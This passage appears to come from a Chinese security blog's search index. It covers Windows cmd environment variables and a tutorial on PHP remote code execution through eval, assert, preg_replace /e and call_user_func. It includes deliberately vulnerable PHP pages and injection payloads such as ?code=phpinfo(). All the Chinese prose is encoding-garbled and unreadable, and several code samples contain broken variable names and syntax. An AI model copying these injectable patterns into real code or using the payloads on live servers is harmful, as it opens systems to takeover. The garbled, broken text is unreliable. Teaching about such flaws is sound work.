%CMDCMDLINE% æœ¬åœ° è¿”å›ç”¨æ¥å¯åŠ¨å½“å‰çš„ Cmd.exe çš„å‡†ç¡®å‘½ä»¤è¡Œã€‚ %CMDEXTVERSION% ç³»ç»Ÿ è¿”å›å½“å‰çš„â€œå‘½ä»¤å¤„ç†ç¨‹åºæ‰©å±•â€çš„ç‰ˆæœ¬å·ã€‚ %COMPUTERNAME%  ç³»ç»Ÿ è¿”å›è®¡ç®—æœºçš„åç§°ã€‚ %COMSPEC%  ç³»ç»Ÿ è¿”å›å‘½ä»¤è¡Œè§£é‡Šå™¨å¯æ‰§è¡Œç¨‹åºçš„å‡†ç¡®è·¯å¾„ã€‚ %DATE%  ç³»ç»Ÿ è¿”å›å½“å‰æ—¥æœŸã€‚ä½¿ç”¨ä¸ <span class="token function">date</span> /t å‘½ä»¤ç›¸åŒçš„æ ¼å¼ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚æœ‰å…³ <span class="token function">date</span> å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Dateã€‚ %ERRORLEVEL%  ç³»ç»Ÿ è¿”å›ä¸Šä¸€æ¡å‘½ä»¤çš„é”™è¯¯ä»£ç ã€‚é€šå¸¸ç”¨éé›¶å€¼è¡¨ç¤ºé”™è¯¯ã€‚ %HOMEDRIVE%  ç³»ç»Ÿ è¿”å›è¿æ¥åˆ°ç”¨æˆ·ä¸»ç›®å½•çš„æœ¬åœ°å·¥ä½œç«™é©±åŠ¨å™¨å·ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚ %HOMEPATH%  ç³»ç»Ÿ è¿”å›ç”¨æˆ·ä¸»ç›®å½•çš„å®Œæ•´è·¯å¾„ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚ %HOMESHARE%  ç³»ç»Ÿ è¿”å›ç”¨æˆ·çš„å…±äº«ä¸»ç›®å½•çš„ç½‘ç»œè·¯å¾„ã€‚åŸºäºä¸»ç›®å½•å€¼è€Œè®¾ç½®ã€‚ç”¨æˆ·ä¸»ç›®å½•æ˜¯åœ¨â€œæœ¬åœ°ç”¨æˆ·å’Œç»„â€ä¸­æŒ‡å®šçš„ã€‚ %LOGONSERVER%  æœ¬åœ° è¿”å›éªŒè¯å½“å‰ç™»å½•ä¼šè¯çš„åŸŸæ§åˆ¶å™¨çš„åç§°ã€‚ %NUMBER_OF_PROCESSORS%  ç³»ç»Ÿ æŒ‡å®šå®‰è£…åœ¨è®¡ç®—æœºä¸Šçš„å¤„ç†å™¨çš„æ•°ç›®ã€‚ %OS%  ç³»ç»Ÿ è¿”å›æ“ä½œç³»ç»Ÿåç§°ã€‚Windows <span class="token number">2000</span> æ˜¾ç¤ºå…¶æ“ä½œç³»ç»Ÿä¸º Windows_NTã€‚ %<span class="token environment constant">PATH</span>% ç³»ç»Ÿ æŒ‡å®šå¯æ‰§è¡Œæ–‡ä»¶çš„æœç´¢è·¯å¾„ã€‚ %PATHEXT% ç³»ç»Ÿ è¿”å›æ“ä½œç³»ç»Ÿè®¤ä¸ºå¯æ‰§è¡Œçš„æ–‡ä»¶æ‰©å±•åçš„åˆ—è¡¨ã€‚ %PROCESSOR_ARCHITECTURE%  ç³»ç»Ÿ è¿”å›å¤„ç†å™¨çš„èŠ¯ç‰‡ä½“ç³»ç»“æ„ã€‚å€¼ï¼šx86 æˆ– IA64ï¼ˆåŸºäº Itaniumï¼‰ã€‚ %PROCESSOR_IDENTFIER% ç³»ç»Ÿ è¿”å›å¤„ç†å™¨è¯´æ˜ã€‚ %PROCESSOR_LEVEL%  ç³»ç»Ÿ è¿”å›è®¡ç®—æœºä¸Šå®‰è£…çš„å¤„ç†å™¨çš„å‹å·ã€‚ %PROCESSOR_REVISION% ç³»ç»Ÿ è¿”å›å¤„ç†å™¨çš„ç‰ˆæœ¬å·ã€‚ %PROMPT% æœ¬åœ° è¿”å›å½“å‰è§£é‡Šç¨‹åºçš„å‘½ä»¤æç¤ºç¬¦è®¾ç½®ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚ %<span class="token environment constant">RANDOM</span>% ç³»ç»Ÿ è¿”å› <span class="token number">0</span> åˆ° <span class="token number">32767</span> ä¹‹é—´çš„ä»»æ„åè¿›åˆ¶æ•°å­—ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚ %SYSTEMDRIVE% ç³»ç»Ÿ è¿”å›åŒ…å« Windows server operating system æ ¹ç›®å½•ï¼ˆå³ç³»ç»Ÿæ ¹ç›®å½•ï¼‰çš„é©±åŠ¨å™¨ã€‚ %SYSTEMROOT%  ç³»ç»Ÿ è¿”å› Windows server operating system æ ¹ç›®å½•çš„ä½ç½®ã€‚ %TEMP% å’Œ %TMP% ç³»ç»Ÿå’Œç”¨æˆ· è¿”å›å¯¹å½“å‰ç™»å½•ç”¨æˆ·å¯ç”¨çš„åº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„é»˜è®¤ä¸´æ—¶ç›®å½•ã€‚æœ‰äº›åº”ç”¨ç¨‹åºéœ€è¦ TEMPï¼Œè€Œå…¶ä»–åº”ç”¨ç¨‹åºåˆ™éœ€è¦ TMPã€‚ %TIME% ç³»ç»Ÿ è¿”å›å½“å‰æ—¶é—´ã€‚ä½¿ç”¨ä¸ <span class="token function">time</span> /t å‘½ä»¤ç›¸åŒçš„æ ¼å¼ã€‚ç”± Cmd.exe ç”Ÿæˆã€‚æœ‰å…³ <span class="token function">time</span> å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Timeã€‚ %USERDOMAIN% æœ¬åœ° è¿”å›åŒ…å«ç”¨æˆ·å¸æˆ·çš„åŸŸçš„åç§°ã€‚ %USERNAME% æœ¬åœ° è¿”å›å½“å‰ç™»å½•çš„ç”¨æˆ·çš„åç§°ã€‚ %USERPROFILE% æœ¬åœ° è¿”å›å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶çš„ä½ç½®ã€‚ %WINDIR% ç³»ç»Ÿ è¿”å›æ“ä½œç³»ç»Ÿç›®å½•çš„ä½ç½®ã€‚%allusersprofile%--------------------æ‰€æœ‰ç”¨æˆ·çš„profileè·¯å¾„%Userprofile%-----------------------å½“å‰ç”¨æˆ·çš„é…ç½®æ–‡ä»¶ç›®å½•%Appdata%--------------------------å½“å‰ç”¨æˆ·çš„åº”ç”¨ç¨‹åºè·¯å¾„%commonprogramfiles%-------------åº”ç”¨ç¨‹åºå…¬ç”¨çš„æ–‡ä»¶è·¯å¾„%homedrive%------------------------å½“å‰ç”¨æˆ·çš„ä¸»ç›˜%Homepath%------------------------å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•%programfiles%----------------------åº”ç”¨ç¨‹åºçš„é»˜è®¤å®‰è£…ç›®å½•%systemdrive%----------------------ç³»ç»Ÿæ‰€åœ¨çš„ç›˜ç¬¦%systemroot%-----------------------ç³»ç»Ÿæ‰€åœ¨çš„ç›®å½•%windir%----------------------------åŒä¸Šï¼Œæ€»æ˜¯è·Ÿsystemrootä¸€æ ·%tmp%------------------------------å½“å‰ç”¨æˆ·çš„ä¸´æ—¶ç›®å½•%temp%-----------------------------åŒä¸Šä¸´æ—¶ç›®å½•<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webå®‰å…¨ </tag>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œæ¼æ´ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)æ¼æ´</title>
      <link href="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/"/>
      <url>/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¦‚è¿°"><a href="#ä¸€ã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¦‚è¿°" class="headerlink" title="ä¸€ã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¦‚è¿°"></a>ä¸€ã€è¿œç¨‹ä»£ç æ‰§è¡Œæ¦‚è¿°</h1><p>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRemote Code Executionï¼Œç®€ç§°RCEï¼‰æ˜¯ä¸€ç§ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚è¿™ç§æ¼æ´é€šå¸¸å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿæœªèƒ½æ­£ç¡®éªŒè¯ç”¨æˆ·è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„ä»£ç ã€‚æ”»å‡»è€…åˆ©ç”¨RCEæ¼æ´å¯ä»¥åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œæ¶æ„æ“ä½œï¼Œå¦‚çªƒå–æ•°æ®ã€ç¯¡æ”¹ç³»ç»Ÿé…ç½®ã€å®‰è£…æ¶æ„è½¯ä»¶æˆ–å®Œå…¨æ§åˆ¶ç›®æ ‡ç³»ç»Ÿã€‚RCEæ¼æ´å¯èƒ½å­˜åœ¨äºå„ç§è½¯ä»¶å’Œç³»ç»Ÿä¸­ï¼ŒåŒ…æ‹¬Webåº”ç”¨ç¨‹åºã€æœåŠ¡å™¨è½¯ä»¶ã€æ“ä½œç³»ç»Ÿç­‰ã€‚</p><h2 id="1-1-æ¼æ´åŸç†"><a href="#1-1-æ¼æ´åŸç†" class="headerlink" title="1.1 æ¼æ´åŸç†"></a>1.1 æ¼æ´åŸç†</h2><p>RCEï¼ˆRemote Code Executionï¼‰è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ä»¥PHPä¸ºä¾‹ï¼ŒPHPä»£ç æ‰§è¡Œæ¼æ´çš„åŸç†åŠæˆå› ï¼š</p><p>ä»£ç æ‰§è¡Œ(æ³¨å…¥) (Webæ–¹é¢)æ˜¯æŒ‡åº”ç”¨ç¨‹åºè¿‡æ»¤ä¸ä¸¥ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¯·æ±‚å°†ä»£ç æ³¨å…¥åˆ°åº”ç”¨ä¸­æ‰§è¡Œã€‚ä»£ç æ‰§è¡Œ(æ³¨å…¥)ç±»ä¼¼äºSQLæ³¨å…¥æ¼æ´ï¼ŒSQLiæ˜¯å°†SQLè¯­å¥æ³¨å…¥åˆ°æ•°æ®åº“ä¸­æ‰§è¡Œï¼Œè€Œä»£ç æ‰§è¡Œåˆ™æ˜¯å¯ä»¥æŠŠä»£ç æ³¨å…¥åˆ°åº”ç”¨ä¸­æœ€ç»ˆç”±æœåŠ¡å™¨è¿è¡Œå®ƒã€‚è¿™æ ·çš„æ¼æ´å¦‚æœæ²¡æœ‰ç‰¹æ®Šçš„è¿‡æ»¤ï¼Œç›¸å½“äºç›´æ¥æœ‰ä¸€ä¸ªWebåé—¨çš„å­˜åœ¨ã€‚</p><table><thead><tr><th>æ¡ä»¶1:ç¨‹åºä¸­å«æœ‰å¯ä»¥æ‰§è¡ŒPHPä»£ç çš„å‡½æ•°æˆ–è¯­è¨€ç»“æ„ã€‚</th></tr></thead><tbody><tr><td><strong>æ¡ä»¶2:ä¼ å…¥æ¡ä»¶1ä¸­çš„å‚æ•°ï¼Œå®¢æˆ·ç«¯å¯æ§ï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹æˆ–å½±å“ã€‚</strong></td></tr></tbody></table><h2 id="1-2-æ¼æ´å±å®³"><a href="#1-2-æ¼æ´å±å®³" class="headerlink" title="1.2 æ¼æ´å±å®³"></a>1.2 æ¼æ´å±å®³</h2><p>Webåº”ç”¨å¦‚æœå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´æ˜¯ä¸€ä»¶éå¸¸å¯æ€•çš„äº‹æƒ…ï¼Œå°±åƒä¸€ä¸ªäººæ²¡æœ‰ç©¿è¡£æœï¼Œèµ¤è£¸è£¸çš„æš´éœ²åœ¨å…‰å¤©åŒ–æ—¥ä¹‹ä¸‹ã€‚å¯ä»¥é€šè¿‡ä»£ç æ‰§è¡Œæ¼æ´ç»§æ‰¿Webç”¨æˆ·æƒé™ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚å¦‚æœå…·æœ‰æœåŠ¡å™¨æ²¡æœ‰æ­£ç¡®é…ç½®ï¼ŒWebç”¨æˆ·æƒé™æ¯”è¾ƒé«˜çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å†™ç›®æ ‡æœåŠ¡å™¨ä»»æ„æ–‡ä»¶å†…å®¹ï¼Œç”šè‡³æ§åˆ¶æ•´ä¸ªç½‘ç«™ä»¥åŠæœåŠ¡å™¨ã€‚</p><p>   ä¸‹æ–‡ä»¥PHPä¸ºä¾‹å­æ¥è¯´æ˜ä»£ç æ‰§è¡Œæ¼æ´ã€‚ PHPä¸­æœ‰å¾ˆå¤šå‡½æ•°å’Œè¯­å¥éƒ½ä¼šé€ æˆPHPä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><h1 id="äºŒã€ç›¸å…³å‡½æ•°å’Œè¯­å¥"><a href="#äºŒã€ç›¸å…³å‡½æ•°å’Œè¯­å¥" class="headerlink" title="äºŒã€ç›¸å…³å‡½æ•°å’Œè¯­å¥"></a>äºŒã€ç›¸å…³å‡½æ•°å’Œè¯­å¥</h1><h2 id="2-1-eval"><a href="#2-1-eval" class="headerlink" title="2.1 eval()"></a>2.1 eval()</h2><p>eval()ä¼šå°†å­—ç¬¦ä¸²å½“ä½œphpä»£ç æ‰§è¡Œã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?</span> php<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please submit code!&lt;br /&gt;?code=phpinfo() ;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æäº¤å˜é‡çš„æ–¹å¼ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">?</span>code<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">{</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">?</span>code<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="PHP-evalå‡½æ•°RCEç¤ºä¾‹ï¼š"><a href="#PHP-evalå‡½æ•°RCEç¤ºä¾‹ï¼š" class="headerlink" title="PHP evalå‡½æ•°RCEç¤ºä¾‹ï¼š"></a>PHP evalå‡½æ•°RCEç¤ºä¾‹ï¼š</h4><p>C:\phpstudy\WWW\code-i\eval.php</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.33.46.png" style="zoom:55%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.34.44.png" style="zoom:45%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.45.48.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.46.41.png" a="" style="zoom:75%;"><p>åˆ†å·éš”å¼€ï¼Œæ‰§è¡Œå¤šæ¡è¯­å¥ã€‚</p></blockquote><h2 id="2-2-assert"><a href="#2-2-assert" class="headerlink" title="2.2 assert()"></a>2.2 assert()</h2><p>assert( )åŒæ ·ä¼šä½œä¸ºPHPä»£ç æ‰§è¡Œ</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$__GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_</span> <span class="token constant">GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">' code'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Please submit code!&lt;br /&gt;?code=phpinfo()"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">æäº¤å‚æ•° <span class="token punctuation">[</span>?code<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>æˆ–<span class="token punctuation">[</span>?code<span class="token operator">=</span>phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="PHP-assert-å‡½æ•°RCEç¤ºä¾‹ï¼š"><a href="#PHP-assert-å‡½æ•°RCEç¤ºä¾‹ï¼š" class="headerlink" title="PHP assert()å‡½æ•°RCEç¤ºä¾‹ï¼š"></a>PHP assert()å‡½æ•°RCEç¤ºä¾‹ï¼š</h4><p>C:\phpstudy\WWW\code-i\assert.php</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.51.45.png" style="zoom:55%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.52.29.png" style="zoom:75%;"><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.53.29.png" style="zoom:75%;"><p>echo md5(1);ä¸èƒ½æ‰§è¡Œ</p><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%883.54.40.png" style="zoom:75%;"><p>ä¸èƒ½æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</p></blockquote><h2 id="2-3-preg-replace"><a href="#2-3-preg-replace" class="headerlink" title="2.3 preg_replace()"></a>2.3 preg_replace()</h2><p>preg_ replace() å‡½æ•°çš„ä½œç”¨æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ­£åˆ™å¤„ç†ã€‚</p><p>å‚æ•°å’Œè¿”å›å€¼å¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mixed preg_replace <span class="token punctuation">(</span>mixed <span class="token variable">$pattern</span>, mixed <span class="token variable">$replacement</span> , mixed <span class="token variable">$subject</span><span class="token punctuation">[</span>,int limit <span class="token operator">=</span> -1<span class="token punctuation">[</span>,int <span class="token operator">&amp;</span><span class="token variable">$count</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ®µä»£ç çš„å«ä¹‰æ˜¯æœç´¢$subjectä¸­åŒ¹é…$patternçš„éƒ¨åˆ†ï¼Œä»¥$ replacementè¿›è¡Œæ›¿æ¢ï¼Œè€Œå½“$patternå¤„ï¼Œå³ç¬¬ä¸€ä¸ªå‚æ•°å­˜åœ¨eä¿®é¥°ç¬¦æ—¶ï¼Œ$replacementçš„å€¼ä¼šè¢«å½“æˆPHPä»£ç æ¥æ‰§è¡Œã€‚</p><p>å…¸å‹çš„ä»£ç å¦‚ä¸‹:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_</span> <span class="token constant">GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_</span> <span class="token constant">GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[(.*)\]/e"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\1'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token string double-quoted-string">"?code= [phpinfo()]"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>  \\1ä»£è¡¨æ­£åˆ™ç¬¬ä¸€æ¬¡åŒ¹é…çš„å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><h4 id="PHP-preg-replace-å‡½æ•°RCEç¤ºä¾‹ï¼š"><a href="#PHP-preg-replace-å‡½æ•°RCEç¤ºä¾‹ï¼š" class="headerlink" title="PHP preg_replace()å‡½æ•°RCEç¤ºä¾‹ï¼š"></a>PHP preg_replace()å‡½æ•°RCEç¤ºä¾‹ï¼š</h4><p> C:\phpstudy\WWW\code-i\preg_replace.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        @<span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[(.*)\]/e"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\1'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span><span class="token string double-quoted-string">"?code= [phpinfo()]"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/11/web-an-quan/yuan-cheng-dai-ma-zhi-xing-rce-lou-dong/%E6%88%AA%E5%B1%8F2021-06-27%20%E4%B8%8B%E5%8D%884.20.30.png" style="zoom:75%;"><p>æäº¤å‚æ•° [?code=[phpinfo()]]ï¼Œ phpinfo(ï¼‰ ä¼šè¢«æ‰§è¡Œã€‚</p></blockquote><h2 id="2-4-call-user-func"><a href="#2-4-call-user-func" class="headerlink" title="2.4 call_user_func()"></a>2.4 call_user_func()</h2><p>call_user_func( )ç­‰å‡½æ•°éƒ½æœ‰è°ƒç”¨å…¶ä»–å‡½æ•°çš„åŠŸèƒ½ï¼Œå…¶ä¸­çš„ä¸€ä¸ªå‚æ•°ä½œä¸ºè¦è°ƒç”¨çš„å‡½æ•°åï¼Œé‚£å¦‚æœè¿™ä¸ªä¼ å…¥çš„å‡½æ•°åå¯æ§ï¼Œé‚£å°±å¯ä»¥è°ƒç”¨æ„å¤–çš„å‡½æ•°æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p><p>ä»¥call_user_func()ä¸ºä¾‹å­ï¼Œè¯¥å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œ åé¢çš„å‚æ•°ä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œæµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$fun</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token variable">$para</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'para'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span> <span class="token variable">$fun</span><span class="token punctuation">,</span> <span class="token variable">$para</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token string double-quoted-string">"?fun=assert&amp;amp; para=phpinfo()"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æäº¤å‚æ•° [?fun=assert&amp;para=phpinfo()]</p><blockquote><h4 id="PHP-call-user-func-å‡½æ•°RCEç¤ºä¾‹ï¼š"><a href="#PHP-call-user-func-å‡½æ•°RCEç¤ºä¾‹ï¼š" class="headerlink" title="PHP call_user_func()å‡½æ•°RCEç¤ºä¾‹ï¼š"></a>PHP call_user_func()å‡½æ•°RCEç¤ºä¾‹ï¼š</h4><p>C:\phpstudy\WWW\code-i\call_user_func.php</p><img 